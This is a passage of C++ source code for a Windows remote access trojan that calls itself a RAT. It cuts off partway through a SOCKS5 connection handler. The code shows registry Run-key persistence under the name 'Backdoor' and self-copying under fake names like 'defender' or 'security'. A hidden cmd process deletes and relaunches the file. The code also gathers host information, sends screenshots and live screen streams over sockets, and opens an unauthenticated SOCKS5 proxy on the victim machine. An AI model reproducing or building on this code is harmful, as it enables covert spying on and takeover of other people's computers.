#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <winsock2.h> // Include winsock2.h before windows.h
#include <windows.h>
#include <ws2tcpip.h>
#include <objidl.h>   // For IStream
#include <gdiplus.h>  // Add GDI+ for screenshot capability
#include <memory>     // For smart pointers
#include <tlhelp32.h> // For process management functions
#include <iphlpapi.h>
// Removed unused map header
#include <psapi.h> // For GetModuleFileNameExA
#include <sstream>
#include <algorithm>
#include <cstdint>
#include <shlobj.h> // For SHGetFolderPath
#include <direct.h> // For _getcwd
#include <iomanip> // For std::setprecision
#include <fstream> // For file operations
// Basic headers for RAT functionality

// Link with required libraries
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")    // Link with psapi library

// Use Gdiplus namespace
using namespace Gdiplus;

#define PORT 8888
#define BUFFER_SIZE 1024
#define SERVER_IP "127.0.0.1" // Change to your server IP

// Screen sharing globals
static bool g_screen_sharing_active = false;
static HANDLE g_screen_sharing_thread = NULL;
static SOCKET g_screen_sharing_socket = INVALID_SOCKET;
static CRITICAL_SECTION g_screen_sharing_cs;

// SOCKS5 Proxy globals
static bool g_proxy_active = false;
static HANDLE g_proxy_thread = NULL;
static SOCKET g_proxy_socket = INVALID_SOCKET;
static CRITICAL_SECTION g_proxy_cs;
static int g_proxy_port = 0;
static std::vector<HANDLE> g_proxy_client_threads;
static std::vector<SOCKET> g_proxy_client_sockets;

// Forward declarations for all functions
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void establish_persistence();
std::string get_sysinfo();
bool receive_file(SOCKET sock, const std::string& destination_path);
bool send_file(SOCKET sock, const std::string& file_path);
bool capture_and_send_screenshot(SOCKET sock);
std::string list_processes();
DWORD GetActualProcessIdByName(const std::string& processName);
std::string start_process(const std::string& command);
HWND FindApplicationWindow(const std::string& processNameOrId);
std::string send_keystrokes(const std::string& processNameOrId, const std::string& keys);
std::string click_at_position(const std::string& processName, int x, int y);
std::string launch_from_start_menu(const std::string& appName);
std::string send_keystrokes_at_cursor(const std::string& keys);
void processSpecialKey(const std::string& key, std::vector<INPUT>& inputs);
std::string open_youtube_without_ads(const std::string& url);
std::string search_process(const std::string& process_name);
std::string get_network_info();
std::string get_system_logs(const char* log_type, int num_entries);
// Screen sharing function declarations
bool capture_screen_frame(std::vector<BYTE>& buffer, DWORD& size);
DWORD WINAPI screen_sharing_thread(LPVOID lpParam);
std::string start_screen_sharing(SOCKET sock);
std::string stop_screen_sharing();
// SOCKS5 Proxy function declarations
std::string start_socks5_proxy(int port = 0);
std::string stop_socks5_proxy();
std::string get_proxy_status();
DWORD WINAPI socks5_proxy_server_thread(LPVOID lpParam);
DWORD WINAPI socks5_client_handler_thread(LPVOID lpParam);
bool socks5_handle_authentication(SOCKET client_socket);
bool socks5_handle_connection_request(SOCKET client_socket);
void socks5_relay_data(SOCKET client_socket, SOCKET target_socket);
int get_available_port();
std::string get_local_ip();
std::string get_public_ip();
std::string get_proxy_configuration_info(int port);
// Removed evasion function declarations

// Simple string encryption for basic obfuscation
std::string simple_xor_encrypt(const std::string& data, char key) {
    std::string result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key;
    }
    return result;
}

// Encrypted strings (will be decrypted at runtime)
namespace encrypted_strings {
    const char key = 0x7A;
    
    std::string get_appdata_filename() {
        std::string filename = "windows32.exe";
        return filename; // Simple filename without encryption
    }
    
    std::string get_registry_key() {
        std::string regkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        return regkey; // Simple registry key without encryption
    }
    
    std::string get_registry_value() {
        std::string regvalue = "Backdoor";
        return regvalue; // Simple registry value without encryption
    }
}

// Polymorphic filename generation for evasion
namespace polymorphic {
    // Generate a random filename that looks legitimate
    std::string generate_random_filename() {
        // Common legitimate-looking filename patterns
        std::vector<std::string> prefixes = {
            "windows", "system", "microsoft", "update", "service", "driver", 
            "security", "defender", "antivirus", "backup", "sync", "cloud",
            "office", "adobe", "intel", "nvidia", "realtek", "audio"
        };
        
        std::vector<std::string> suffixes = {
            "32", "64", "service", "helper", "manager", "updater", "sync",
            "driver", "host", "client", "agent", "monitor", "scanner"
        };
        
        // Use current time as seed for randomization
        srand((unsigned int)GetTickCount());
        
        std::string prefix = prefixes[rand() % prefixes.size()];
        std::string suffix = suffixes[rand() % suffixes.size()];
        
        // Add random number for uniqueness
        int random_num = rand() % 9999 + 1000;
        
        return prefix + suffix + std::to_string(random_num) + ".exe";
    }
    
    // Get the current executable path
    std::string get_current_exe_path() {
        char currentPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) > 0) {
            return std::string(currentPath);
        }
        return "";
    }
    
    // Get directory of current executable
    std::string get_current_directory() {
        std::string currentPath = get_current_exe_path();
        size_t lastSlash = currentPath.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            return currentPath.substr(0, lastSlash + 1);
        }
        return "";
    }
    
    // Check if we're running from AppData (persistence location)
    bool is_running_from_appdata() {
        std::string currentPath = get_current_exe_path();
        std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), ::tolower);
        return currentPath.find("appdata") != std::string::npos;
    }
    
    // Perform polymorphic replication
    bool replicate_with_new_name() {
        if (!is_running_from_appdata()) {
            return false; // Only replicate when running from persistence location
        }
        
        std::string currentPath = get_current_exe_path();
        std::string currentDir = get_current_directory();
        std::string newFilename = generate_random_filename();
        std::string newPath = currentDir + newFilename;
        
        // Don't replicate if we're already using a random name
        std::string currentFilename = currentPath.substr(currentPath.find_last_of("\\/") + 1);
        if (currentFilename != "windows32.exe") {
            return false; // Already polymorphic
        }
        
        // Copy current executable to new filename
        if (CopyFileA(currentPath.c_str(), newPath.c_str(), FALSE)) {
            // Update registry to point to new file
            HKEY hKey;
            std::string regKey = encrypted_strings::get_registry_key();
            std::string regValue = encrypted_strings::get_registry_value();
            
            LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regKey.c_str(), 0, KEY_SET_VALUE, &hKey);
            if (result == ERROR_SUCCESS) {
                RegSetValueExA(hKey, regValue.c_str(), 0, REG_SZ, 
                              (const BYTE*)newPath.c_str(), newPath.length() + 1);
                RegCloseKey(hKey);
            }
            
            // Schedule deletion of current file and launch new one
            std::string batchCmd = "timeout /t 3 /nobreak > nul && del \"" + currentPath + "\" && \"" + newPath + "\"";
            std::string fullCmd = "cmd /c \"" + batchCmd + "\"";
            
            // Launch the batch command and exit current process
            STARTUPINFOA si = {sizeof(STARTUPINFOA)};
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            
            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, FALSE, 
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return true; // Signal to exit current process
            }
        }
        
        return false;
    }
}

// Get detailed system information
std::string get_sysinfo()
{
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    MEMORYSTATUSEX memInfo;
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[256];
    DWORD size = sizeof(computerName);
    DWORD userSize = sizeof(userName);
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    char ipAddress[46]; // IPv4 or IPv6
    std::string additionalInfo = "";

    // Get computer name - use correct format specifier for ANSI version
    if (!GetComputerNameA(computerName, &size)) {
        strncpy(computerName, "Unknown", sizeof(computerName)-1);
    }

    // Get username
    GetUserNameA(userName, &userSize);

    // Get system info
    GetSystemInfo(&sysInfo);

    // Get OS version info
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    // Note: GetVersionEx is deprecated, but still works for basic info
    if (!GetVersionEx((OSVERSIONINFO *)&osInfo)) {
        // Handle error if GetVersionEx fails
        osInfo.dwMajorVersion = 0;
        osInfo.dwMinorVersion = 0;
        osInfo.dwBuildNumber = 0;
#ifdef UNICODE
        wcscpy(osInfo.szCSDVersion, L"Unknown");
#else
        strcpy(osInfo.szCSDVersion, "Unknown");
#endif
    }

    // Get memory info
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    // Get disk info
    GetDiskFreeSpaceExW(L"C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes);

    // Get IP address (simplified)
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostName[256];
    gethostname(hostName, sizeof(hostName));

    struct addrinfo hints, *res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostName, NULL, &hints, &res) != 0) {
        return ""; // Return empty string on failure
    }

    void *addr;
    if (res->ai_family == AF_INET)
    {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
        addr = &(ipv4->sin_addr);
    }
    else
    {
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)res->ai_addr;
        addr = &(ipv6->sin6_addr);
    }

    inet_ntop(res->ai_family, addr, ipAddress, sizeof(ipAddress));
    freeaddrinfo(res);

    // Get processor architecture
    std::string arch;
    switch (sysInfo.wProcessorArchitecture)
    {
    case PROCESSOR_ARCHITECTURE_AMD64:
        arch = "x64 (AMD or Intel)";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        arch = "ARM";
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        arch = "ARM64";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        arch = "x86 (Intel)";
        break;
    default:
        arch = "Unknown";
    }

    // Format the information with better spacing between sections
    char info[BUFFER_SIZE * 4]; // Increased buffer size for additional info
    snprintf(info, BUFFER_SIZE * 4,
             "\n=== DETAILED SYSTEM INFORMATION ===\n\n"
             "=== SYSTEM ===\n"
             "OS: Windows %ld.%ld (Build %ld)\n"
#ifdef UNICODE
             "Service Pack: %s\n"
#else
             "Service Pack: %s\n"
#endif
             "Computer Name: %s\n"
             "Username: %s\n\n"

             "=== PROCESSOR ===\n"
             "Architecture: %s\n"
             "Number of Processors: %ld\n"
             "Processor Level: %d\n"
             "Processor Revision: %d\n\n"

             "=== MEMORY ===\n"
             "Memory Load: %ld%%\n"
             "Total Physical Memory: %.2f GB\n"
             "Available Physical Memory: %.2f GB\n"
             "Total Virtual Memory: %.2f GB\n"
             "Available Virtual Memory: %.2f GB\n\n"

             "=== DISK ===\n"
             "Disk Space: %.2f GB total / %.2f GB free (%.1f%% used)\n\n"

             "=== NETWORK ===\n"
             "IP Address: %s\n\n"
             "%s",

             osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
#ifdef UNICODE
             // Convert wide string to narrow string if in Unicode mode
             [&]() -> std::string {
                 char narrow_version[128];
                 WideCharToMultiByte(CP_UTF8, 0, osInfo.szCSDVersion, -1, narrow_version, sizeof(narrow_version), NULL, NULL);
                 return narrow_version;
             }().c_str(),
#else
             // In ANSI mode, just use the string directly
             osInfo.szCSDVersion,
#endif
             computerName,
             userName,

             arch.c_str(),
             sysInfo.dwNumberOfProcessors,
             sysInfo.wProcessorLevel,
             sysInfo.wProcessorRevision,

             memInfo.dwMemoryLoad,
             (double)memInfo.ullTotalPhys / (1024.0 * 1024.0 * 1024.0),
             (double)memInfo.ullAvailPhys / (1024.0 * 1024.0 * 1024.0),
             (double)memInfo.ullTotalVirtual / (1024.0 * 1024.0 * 1024.0),
             (double)memInfo.ullAvailVirtual / (1024.0 * 1024.0 * 1024.0),

             (double)totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0),
             (double)totalFreeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0),
             100.0 - ((double)totalFreeBytes.QuadPart / totalBytes.QuadPart * 100.0),

             ipAddress,
             additionalInfo.c_str());

    WSACleanup();
    return std::string(info);
}

// Helper function to get encoder CLSID
int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    if (!format || !pClsid) return -1; // Error if parameters are null
    
    UINT num = 0;  // number of image encoders
    UINT size = 0; // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    std::unique_ptr<ImageCodecInfo[]> pImageCodecInfo(new ImageCodecInfo[size]);
    if (pImageCodecInfo == nullptr)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo.get());

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            return j;
        }
    }

    return -1;
}

// Function to capture and send screenshot
bool capture_and_send_screenshot(SOCKET sock)
{
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC screenDC = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);

    // Copy screen to bitmap
    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

    // Save bitmap to memory using GDI+
    Bitmap *bitmap = nullptr;
    bitmap = new Bitmap(hBitmap, NULL);
    // Create a memory stream
    IStream *stream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    // Save bitmap to stream as PNG
    CLSID pngClsid;
    int result = GetEncoderClsid(L"image/png", &pngClsid);
    if (result >= 0) {
        bitmap->Save(stream, &pngClsid, NULL);
    } else {
        // Handle the error
        std::cerr << "Failed to get encoder CLSID: " << result << std::endl;
    }
    
    // Declare and initialize LARGE_INTEGER for stream seek
    LARGE_INTEGER liZero;
    liZero.QuadPart = 0;
    stream->Seek(liZero, STREAM_SEEK_SET, NULL);
    
    // Get stream size
    STATSTG statStg;
    stream->Stat(&statStg, STATFLAG_DEFAULT);
    DWORD streamSize = (DWORD)statStg.cbSize.QuadPart;
    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    stream->Read(buffer.data(), streamSize, &bytesRead);

    // First send the file size
    uint64_t size = streamSize;
    uint8_t size_bytes[8];
    for (int i = 0; i < 8; i++)
    {
        size_bytes[7 - i] = (size >> (i * 8)) & 0xFF;
    }
    send(sock, (char *)size_bytes, 8, 0);

    // Then send the file data
    int total_sent = 0;
    while (total_sent < streamSize)
    {
        int chunk_size = (streamSize - total_sent < 1024) ? static_cast<int>(streamSize - total_sent) : 1024;
        int sent = send(sock, (char *)buffer.data() + total_sent, chunk_size, 0);
        if (sent <= 0)
        {
            break;
        }
        total_sent += sent;
    }

    // Clean up
    stream->Release();
    delete bitmap;
    SelectObject(memDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, screenDC);
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return (total_sent == streamSize);
}

// ============================================================================
// SCREEN SHARING IMPLEMENTATION
// ============================================================================

// Capture a single screen frame with JPEG compression for efficient streaming
bool capture_screen_frame(std::vector<BYTE>& buffer, DWORD& size)
{
    // Initialize GDI+ (should already be initialized in main)
    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC screenDC = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);

    // Copy screen to bitmap
    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

    // Create GDI+ bitmap from HBITMAP
    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
    
    // Create a memory stream
    IStream* stream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    // Save bitmap to stream as JPEG for better compression
    CLSID jpegClsid;
    int result = GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    bool success = false;
    if (result >= 0) {
        // Set JPEG quality to 75% for good balance between quality and size
        EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG quality = 75;
        encoderParams.Parameter[0].Value = &quality;
        
        if (bitmap->Save(stream, &jpegClsid, &encoderParams) == Ok) {
            // Get stream size and data
            LARGE_INTEGER liZero;
            liZero.QuadPart = 0;
            stream->Seek(liZero, STREAM_SEEK_SET, NULL);
            
            STATSTG statStg;
            if (stream->Stat(&statStg, STATFLAG_DEFAULT) == S_OK) {
                size = (DWORD)statStg.cbSize.QuadPart;
                buffer.resize(size);
                
                ULONG bytesRead;
                if (stream->Read(buffer.data(), size, &bytesRead) == S_OK && bytesRead == size) {
                    success = true;
                }
            }
        }
    }

    // Clean up
    stream->Release();
    delete bitmap;
    SelectObject(memDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, screenDC);

    return success;
}

// Screen sharing thread function
DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
{
    SOCKET sock = (SOCKET)(uintptr_t)lpParam;
    std::vector<BYTE> frameBuffer;
    DWORD frameSize;
    
    // Wait a moment for the main thread to send the confirmation message
    Sleep(100);
    
    // Send screen sharing start marker
    const char* start_marker = "##SCREEN_SHARE_START##";
    send(sock, start_marker, strlen(start_marker), 0);
    
    while (true) {
        EnterCriticalSection(&g_screen_sharing_cs);
        bool should_continue = g_screen_sharing_active;
        LeaveCriticalSection(&g_screen_sharing_cs);
        
        if (!should_continue) {
            break;
        }
        
        // Capture screen frame
        if (capture_screen_frame(frameBuffer, frameSize)) {
            // Send frame size first (4 bytes, little-endian)
            char sizeBytes[4];
            sizeBytes[0] = (frameSize) & 0xFF;
            sizeBytes[1] = (frameSize >> 8) & 0xFF;
            sizeBytes[2] = (frameSize >> 16) & 0xFF;
            sizeBytes[3] = (frameSize >> 24) & 0xFF;
            
            if (send(sock, sizeBytes, 4, 0) <= 0) {
                break; // Connection lost
            }
            
            // Send frame data in chunks
            DWORD totalSent = 0;
            while (totalSent < frameSize) {
                DWORD chunkSize = (frameSize - totalSent < 8192) ? (frameSize - totalSent) : 8192; // 8KB chunks
                int sent = send(sock, (char*)frameBuffer.data() + totalSent, chunkSize, 0);
                if (sent <= 0) {
                    goto thread_exit; // Connection lost
                }
                totalSent += sent;
            }
        }
        
        // Control frame rate - aim for ~10 FPS to balance performance and bandwidth
        Sleep(100);
    }
    
thread_exit:
    // Send screen sharing end marker
    const char* end_marker = "##SCREEN_SHARE_END##";
    send(sock, end_marker, strlen(end_marker), 0);
    
    return 0;
}

// Start screen sharing
std::string start_screen_sharing(SOCKET sock)
{
    EnterCriticalSection(&g_screen_sharing_cs);
    
    if (g_screen_sharing_active) {
        LeaveCriticalSection(&g_screen_sharing_cs);
        return "Screen sharing is already active";
    }
    
    g_screen_sharing_active = true;
    g_screen_sharing_socket = sock;
    
    LeaveCriticalSection(&g_screen_sharing_cs);
    
    // Create screen sharing thread
    g_screen_sharing_thread = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        screen_sharing_thread,  // thread function name
        (LPVOID)(uintptr_t)sock, // argument to thread function 
        0,                      // use default creation flags 
        NULL                    // returns the thread identifier 
    );
    
    if (g_screen_sharing_thread == NULL) {
        EnterCriticalSection(&g_screen_sharing_cs);
        g_screen_sharing_active = false;
        LeaveCriticalSection(&g_screen_sharing_cs);
        return "Failed to create screen sharing thread";
    }
    
    return "Screen sharing started successfully - streaming at 10 FPS with JPEG compression";
}

// Stop screen sharing
std::string stop_screen_sharing()
{
    EnterCriticalSection(&g_screen_sharing_cs);
    
    if (!g_screen_sharing_active) {
        LeaveCriticalSection(&g_screen_sharing_cs);
        return "Screen sharing is not active";
    }
    
    g_screen_sharing_active = false;
    LeaveCriticalSection(&g_screen_sharing_cs);
    
    // Wait for thread to finish (with timeout)
    if (g_screen_sharing_thread != NULL) {
        WaitForSingleObject(g_screen_sharing_thread, 2000); // 2 second timeout
        CloseHandle(g_screen_sharing_thread);
        g_screen_sharing_thread = NULL;
    }
    
    g_screen_sharing_socket = INVALID_SOCKET;
    
    return "Screen sharing stopped successfully";
}

// ============================================================================
// END SCREEN SHARING IMPLEMENTATION
// ============================================================================

// ============================================================================
// SOCKS5 PROXY IMPLEMENTATION
// ============================================================================

// Structure to pass data to client handler thread
struct SOCKS5ClientData {
    SOCKET client_socket;
    sockaddr_in client_addr;
};

// Get an available port for the proxy server
int get_available_port() {
    SOCKET test_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (test_socket == INVALID_SOCKET) {
        return 0;
    }
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = 0; // Let system choose port
    
    if (bind(test_socket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(test_socket);
        return 0;
    }
    
    int addr_len = sizeof(addr);
    if (getsockname(test_socket, (sockaddr*)&addr, &addr_len) == SOCKET_ERROR) {
        closesocket(test_socket);
        return 0;
    }
    
    int port = ntohs(addr.sin_port);
    closesocket(test_socket);
    return port;
}

// Get local IP address
std::string get_local_ip() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        return "127.0.0.1";
    }
    
    struct hostent* host_entry = gethostbyname(hostname);
    if (host_entry == nullptr) {
        return "127.0.0.1";
    }
    
    struct in_addr addr;
    addr.s_addr = *((unsigned long*)host_entry->h_addr_list[0]);
    return std::string(inet_ntoa(addr));
}

// Get public IP address using multiple IP detection services
std::string get_public_ip() {
    const char* ip_services[] = {
        "api.ipify.org",
        "ifconfig.me",
        "icanhazip.com",
        "ident.me",
        "ipecho.net"
    };
    const int num_services = sizeof(ip_services) / sizeof(ip_services[0]);
    
    for (int i = 0; i < num_services; i++) {
        try {
            SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == INVALID_SOCKET) continue;
            
            // Resolve hostname
            struct hostent* host = gethostbyname(ip_services[i]);
            if (!host) {
                closesocket(sock);
                continue;
            }
            
            struct sockaddr_in server_addr;
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(80);
            server_addr.sin_addr.s_addr = *(unsigned long*)host->h_addr;
            
            // Set timeout
            DWORD timeout = 2000; // 2 seconds (reduced for faster response)
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
            
            if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
                // Send HTTP GET request
                std::string request = "GET / HTTP/1.1\r\n";
                request += "Host: ";
                request += ip_services[i];
                request += "\r\n";
                request += "User-Agent: Mozilla/5.0\r\n";
                request += "Accept: text/plain\r\n";
                request += "Connection: close\r\n\r\n";
                
                if (send(sock, request.c_str(), request.length(), 0) != SOCKET_ERROR) {
                    char buffer[1024] = {0};
                    int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                    
                    if (bytes_received > 0) {
                        std::string response(buffer);
                        // Find the IP in the response (usually at the end after headers)
                        size_t pos = response.find("\r\n\r\n");
                        if (pos != std::string::npos) {
                            std::string ip = response.substr(pos + 4);
                            // Clean up the IP (remove any whitespace/newlines)
                            ip.erase(std::remove_if(ip.begin(), ip.end(), isspace), ip.end());
                            // Verify it looks like an IP
                            if (ip.length() > 0 && ip.length() < 16 && ip.find_first_not_of("0123456789.") == std::string::npos) {
                                closesocket(sock);
                                return ip;
                            }
                        }
                    }
                }
            }
            closesocket(sock);
        } catch (...) {
            // Try next service if this one fails
            continue;
        }
    }
    
    // If all services fail, fallback to local IP
    return get_local_ip();
}

// Get comprehensive proxy configuration information
std::string get_proxy_configuration_info(int port) {
    std::string local_ip = get_local_ip();
    std::string public_ip = get_public_ip();
    
    std::string config = "SOCKS5 proxy started successfully on port " + std::to_string(port) + "\n\n";
    config += "=== PROXY CONFIGURATION OPTIONS ===\n";
    config += "LAN Access (Local Network):\n";
    config += "  Proxy Address: " + local_ip + ":" + std::to_string(port) + "\n";
    config += "  Use this for devices on the same network\n\n";
    config += "WAN Access (Internet/Remote):\n";
    config += "  Proxy Address: " + public_ip + ":" + std::to_string(port) + "\n";
    config += "  Use this for remote access (requires port forwarding)\n\n";
    config += "Localhost Access (Same Machine):\n";
    config += "  Proxy Address: 127.0.0.1:" + std::to_string(port) + "\n";
    config += "  Use this for testing on the same machine\n\n";
    config += "Authentication: None required\n";
    config += "Protocol: SOCKS5\n";
    config += "Supports: IPv4 addresses and domain names";
    
    return config;
}

// Handle SOCKS5 authentication (we'll use no authentication for simplicity)
bool socks5_handle_authentication(SOCKET client_socket) {
    char buffer[256];
    
    // Receive authentication methods
    int bytes_received = recv(client_socket, buffer, 2, 0);
    if (bytes_received != 2) {
        return false;
    }
    
    if (buffer[0] != 0x05) { // SOCKS version 5
        return false;
    }
    
    int num_methods = buffer[1];
    if (num_methods <= 0 || num_methods > 255) {
        return false;
    }
    
    // Receive authentication methods
    bytes_received = recv(client_socket, buffer, num_methods, 0);
    if (bytes_received != num_methods) {
        return false;
    }
    
    // Check if no authentication (0x00) is supported
    bool no_auth_supported = false;
    for (int i = 0; i < num_methods; i++) {
        if (buffer[i] == 0x00) {
            no_auth_supported = true;
            break;
        }
    }
    
    // Send authentication response
    char response[2];
    response[0] = 0x05; // SOCKS version 5
    response[1] = no_auth_supported ? 0x00 : 0xFF; // No authentication or no acceptable methods
    
    if (send(client_socket, response, 2, 0) != 2) {
        return false;
    }
    
    return no_auth_supported;
}

// Handle SOCKS5 connection request
bool socks5_handle_connection_request(SOCKET client_socket) {
    char buffer[256];
    
    // Receive connection request
    int bytes_received = recv(client_socket, buffer, 4, 0);
    if (bytes_received != 4) {
        return false;
    }
    
    if (buffer[0] != 0x05) { // SOCKS version 5
        return false;
    }
    
    if (buffer[1] != 0x01) { // Only support CONNECT command
        // Send error response
        char error_response[10] = {0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        send(client_socket, error_response, 10, 0);
        return false;
    }
    
    if (buffer[2] != 0x00) { // Reserved byte must be 0x00
        return false;
    }
    
    char address_type = buffer[3];
    std::string target_host;
    int target_port;
    
    if (address_type == 0x01) { // IPv4 address
        bytes_received = recv(client_socket, buffer, 6, 0); // 4 bytes IP + 2 bytes port
        if (bytes_received != 6) {
            return false;
        }
        
        // Extract IP address
        char ip_str[16];
        sprintf_s(ip_str, "%d.%d.%d.%d", 
                 (unsigned char)buffer[0], (unsigned char)buffer[1], 
                 (unsigned char)buffer[2], (unsigned char)buffer[3]);
        target_host = ip_str;
        
        // Extract port
        target_port = ntohs(*(unsigned short*)(buffer + 4));
        
    } else if (address_type == 0x03) { // Domain name
        bytes_received = recv(client_socket, buffer, 1, 0);
        if (bytes_received != 1) {
            return false;
        }
        
        int domain_length = (unsigned char)buffer[0];
        if (domain_length <= 0 || domain_length > 255) {
            return false;
        }
        
        bytes_received = recv(client_socket, buffer, domain_length + 2, 0); // domain + 2 bytes port
        if (bytes_received != domain_length + 2) {
            return false;
        }
        
        target_host = std::string(buffer, domain_length);
        target_port = ntohs(*(unsigned short*)(buffer + domain_length));
        
    } else {
        // Unsupported address type
        char error_response[10] = {0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        send(client_socket, error_response, 10, 0);
        return false;
    }
    
    // Create connection to target
    SOCKET target_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (target_socket == INVALID_SOCKET) {
        char error_response[10] = {0x05, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        send(client_socket, error_response, 10, 0);
        return false;
    }
    
    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    
    // Resolve hostname if needed
    if (address_type == 0x03) {
        struct addrinfo hints, *result;
        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        if (getaddrinfo(target_host.c_str(), NULL, &hints, &result) != 0) {
            closesocket(target_socket);
            char error_response[10] = {0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            send(client_socket, error_response, 10, 0);
            return false;
        }
        
        target_addr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
        freeaddrinfo(result);
    } else {
        if (inet_pton(AF_INET, target_host.c_str(), &target_addr.sin_addr) <= 0) {
            closesocket(target_socket);
            char error_response[10] = {0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            send(client_socket, error_response, 10, 0);
            return false;
        }
    }
    
    // Connect to target
    if (connect(target_socket, (sockaddr*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
        closesocket(target_socket);
